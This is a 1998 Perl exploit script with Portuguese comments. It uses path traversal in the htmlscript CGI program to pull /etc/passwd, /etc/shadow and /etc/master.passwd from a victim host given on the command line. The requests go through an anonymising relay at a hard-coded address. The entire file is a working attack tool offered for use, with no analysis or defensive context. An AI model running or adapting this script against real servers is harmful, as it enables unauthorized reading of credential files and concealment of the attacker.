#!/usr/bin/perl -w
#	$Id: htmlscript.pl,v 1.1 1998/01/29 06:28:52 zap Exp $
#
# Obtém /etc/{passwd,shadow,master.passwd} ou qualquer arquivo de servers
# vulneraveis à htmlscript. A requisição HTTP será feita através de um
# roteador anonimo.
#
# Copyright (c) 1998 by zap <zap@arosnet.se>
# Tradução Douglas Vigliazzi e adaptação
# $Log: htmlscript.pl,v $
# Initial revision
#

use strict;
use Socket;

my ($verbose, $onion_router, $onion_port, $onion_timeout, $iaddr, $paddr,
    $proto, $line);

$verbose	= 1;
$onion_router	= "132.250.80.12";
$onion_port	= 9200;
$onion_timeout	= 10;
$iaddr		= inet_aton($onion_router);
$paddr		= sockaddr_in($onion_port, $iaddr);
$proto		= getprotobyname("tcp");

my ($victim, $file) = @ARGV or die "Usar: httpscript.pl <host> [<arquivo>]\n";

sub get_file {
	$SIG{"ALRM"}    = sub { close(ONION); };
	alarm $onion_timeout;
	
	socket(ONION, AF_INET, SOCK_STREAM, $proto);
	select(ONION); $| = 1; select(STDOUT);

	if (connect(ONION, $paddr)) {
		$SIG{"ALRM"} = "IGNORAR";
		print "[ $victim:$file ]\n" if $verbose;
		print ONION "GET http://$victim/cgi-bin/htmlscript?../../../",
			    "../../../../..$file\n\n";
		while (defined($line = <ONION>)) { print $line }
	} else {
		die "Erro: Conexão para roteador $onion_router esgotada ",
		    " ($onion_timeout\s).\n";
	}
	close(ONION);
}

if ($file) { get_file; } else {
	$file = "/etc/passwd"; get_file;
	$file = "/etc/shadow"; get_file;
	$file = "/etc/master.passwd"; get_file;
}
